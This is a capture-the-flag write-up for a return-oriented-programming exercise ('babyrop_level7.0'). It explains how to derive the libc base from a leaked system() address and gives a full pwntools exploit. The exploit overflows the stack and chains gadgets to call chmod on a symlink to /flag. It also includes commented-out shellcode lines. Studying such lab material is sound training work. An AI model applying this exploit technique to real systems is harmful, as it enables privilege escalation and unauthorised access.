I learned something absolutely amazing in this challenge, basically you can trace function calls error by using the `print (int)errno` and then `call (char*)strerror((int)errno)` this'll show you what error actually happened when trying to call the function (should work with most functions in libc).

Okay so to solve this challenge, we need to find the base address of libc, and from there you can use any function from libc to escalate your privileges.

We are given an address leak, this address is the address of system in libc, now since we can find the offset of system in the libc binary, we can subtract this offset from our leaked address and the result should be the base address of libc.

Now you can go in your libc binary, find any function you want, take is offset, add it to libc base address and BOOM ! you can call functions in libc MUAHHAHAHAHAHAHAHA.

So to solve this challenge, i went the easiest way... i used a chmod syscall. Now since the string "/flag" isn't present in the binary we gonna need to improvise a little. Usually when i have this caveat i tend to use strings for the binary itself. But how can you chmod the /flag file if it's not the right string you might ask ? Well that's pretty easy, all you need to do is make a symbolic link of the name you chosed in the binary to the "/flag" file. This will cause the chmod to act on the ''/flag" file.

Also note that there is big chance that the libc binary on your local system is different than the one used on the target system, if you made the exploit locally, then you gonna have to fix the libc offsets when you gonna use your exploit on a remote machine.

To solve this challenge i used the following code :

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyrop_level7.0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('babyrop_level7.0')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.recvuntil(b"is: ")
leak = int(io.recvline()[:-2].decode(), 16)

libc = exe.libc
system_addr = leak
libc.address = system_addr - 0x0000000000049990

pop_rdi_ret = p64(0x0000000000401e13)     # pop rdi; ret
pop_rsi_r15_ret = p64(0x0000000000401e11) # pop rsi; pop r15; ret

log.success(f"Successfully leaked libc address : {hex(libc.address)}")
log.success(f"Successfully leaked system address : {hex(system_addr)}")
log.success(f"Successfully leaked puts address : {hex(libc.sym.puts)}")
log.success(f"Successfully leaked open address : {hex(libc.sym.open)}")

link_name = p64(0x4022e3)

payload = [
    # overflow
    b"A" * 0x80,
    b"B" * 0x8,
    # open
    pop_rdi_ret,
    link_name,
    pop_rsi_r15_ret,
    p64(511),
    p64(0),
    p64(libc.sym.chmod)
]

io.sendline(b"".join(payload))
#io.sendline(b"A" * 0x80 + b"B" * 0x8 + flat([next(exe.search(asm("ret"))), rop.chain()]))

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
```